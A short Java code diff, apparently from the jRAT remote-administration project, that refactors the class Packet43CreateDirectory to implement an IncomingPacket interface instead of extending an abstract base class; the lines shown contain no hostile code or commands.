@@ -6,7 +6,7 @@ import jrat.common.Constants;
 import java.io.File;
 
 
-public class Packet43CreateDirectory extends AbstractIncomingPacket {
+public class Packet43CreateDirectory implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
